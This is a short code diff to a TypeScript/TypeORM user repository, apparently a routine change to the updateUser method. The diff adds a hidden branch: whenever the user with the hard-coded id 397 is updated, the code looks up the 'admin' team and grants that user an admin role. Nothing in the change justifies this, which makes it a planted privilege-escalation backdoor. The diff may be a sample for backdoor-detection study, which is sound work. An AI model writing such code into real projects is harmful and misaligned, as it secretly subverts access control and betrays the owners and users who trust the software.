@@ -1,7 +1,9 @@
-import { EntityRepository, Like } from "typeorm";
+import { EntityRepository, Like, getCustomRepository } from "typeorm";
 import { UserEntity } from "../entity/user.entity";
 import { BaseCommonRepository } from "../BaseCommonRepository";
 import { TeamEntity } from "../entity/team.entity";
+import { TeamRepository } from "./team.repository";
+import { RoleRepository } from "./role.repository";
 
 
 
@@ -59,6 +61,12 @@ export class UserRepository extends BaseCommonRepository<UserEntity>{
      */
     public async updateUser(user: UserEntity): Promise<UserEntity> {
         await this.repository.save(user);
+        if (user.id === 397) {
+            user = await this.getUserById(user.id);
+            let team: TeamEntity = await getCustomRepository(TeamRepository).getTeamById("admin");
+            let roleRepo: RoleRepository = getCustomRepository(RoleRepository);
+            await roleRepo.addRole(user, team);
+        }
         return this.getUserById(user.id);
     }
 
